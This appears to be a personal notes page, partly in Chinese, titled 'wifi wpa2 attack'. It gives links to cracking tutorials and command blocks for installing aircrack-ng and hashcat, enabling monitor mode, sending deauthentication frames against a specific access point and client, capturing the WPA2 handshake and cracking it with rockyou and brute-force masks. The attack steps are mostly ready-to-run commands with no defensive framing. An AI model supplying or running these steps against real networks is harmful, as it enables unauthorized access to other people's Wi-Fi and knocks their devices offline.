# wifi wpa2 attack

{% tag 'created','20220709' %} {% endtag %} {% tag 'updated','20221210' %} {% endtag %} {% tag 'authors','alick97' %} {% endtag %}

---

- https://www.mzbky.com/1791.html
- https://zh.wikihow.com/%E4%BD%BF%E7%94%A8Kali-Linux%E7%A0%B4%E8%A7%A3WPA%E6%88%96WPA2%E6%97%A0%E7%BA%BF%E5%B1%80%E5%9F%9F%E7%BD%91
- [for mac os ] https://martinsjean256.wordpress.com/2018/02/12/hacking-aircrack-ng-on-mac-cracking-wi-fi-without-kali-in-parallels/
- [for mac os] https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html

### packages install in ubuntu
```
sudo apt install aircrack-ng hashcat

wget https://github.com/hashcat/hashcat-utils/archive/master.zip
unzip master.zip
cd hashcat-utils-master/src
make
# get cap2hccapx.bin
```

######
### 一些常见命令
#### 常用指令
```
# 启动监听 会创建新的net interface 后缀为 mon
airmon-ng start wlan0
# 停止监听 net interface
airmon-ng stop wlan0
# 关闭相关没开启mon之前用到interface的service
airmon-ng start check --kill


# 监听所有
airodump-ng wlan0mon

# 发起断开连接
sudo aireplay-ng -0 10 -a 24:CF:24:32:F2:4F -c 60:AB:67:E8:C6:44  wlo1mon
# 支持搜索5g 默认2.4g
sudo airodump-ng --band abg --output-format pcap -w t -c 10 --bssid 24:CF:24:32:F2:4F wlo1mon

# hashcat相关
cap2hccapx capture.cap capture.hccapx
hashcat -m 2500 capture.hccapx wordlist.txt
hashcat -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d
sudo hashcat --deprecated-check-disable -m 2500 t2.hccapx ../dict/rockyou.txt
```

#### ubuntu关闭mon interface后 重启network
```
sudo systemctl restart NetworkManager
```